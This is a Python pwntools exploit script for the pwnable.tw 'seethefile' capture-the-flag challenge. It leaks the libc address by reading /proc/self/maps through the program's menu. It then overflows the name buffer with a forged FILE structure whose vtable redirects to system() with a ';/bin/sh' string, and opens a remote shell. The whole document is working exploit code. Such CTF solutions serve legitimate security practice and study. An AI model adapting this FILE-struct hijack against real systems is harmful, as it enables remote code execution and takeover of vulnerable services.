from pwn import *


context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10200
LOCAL = False
elf = ELF("./seethefile")

if LOCAL:
    libc = elf.libc
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x08048B0F
            c
            """)
else:
    context.log_level = "info"
    libc = ELF("./libc_32.so.6")
    p = remote(HOST, PORT)

# Exploit starts here
def leak():
    sla(b":", b"1")
    sla(b":", b"/proc/self/maps")
    sla(b":", b"2")
    sla(b":", b"3")
    for i in range(4):
        rl()
    return int(r(8), 16)

if LOCAL:
    libc.address = int(input(), 16)
else:
    libc.address = leak() + 0x1000

info("LIBC: " + hex(libc.address))

# Construct fake FILE struct ptr
fake_fp = elf.symbols["name"] + 0x24
fp = FileStructure()
fp.flags = 0x80808080
fp._IO_read_ptr = u32(b";/bi")
fp._IO_read_end = u32(b"n/sh")
fp.vtable = fake_fp + len(fp)
print(fp)

payload = b"A" * 0x20
payload += p32(fake_fp)
payload += bytes(fp)
payload += p32(libc.symbols["system"]) * 3

sla(b":", b"5")
sla(b":", payload)

p.interactive()
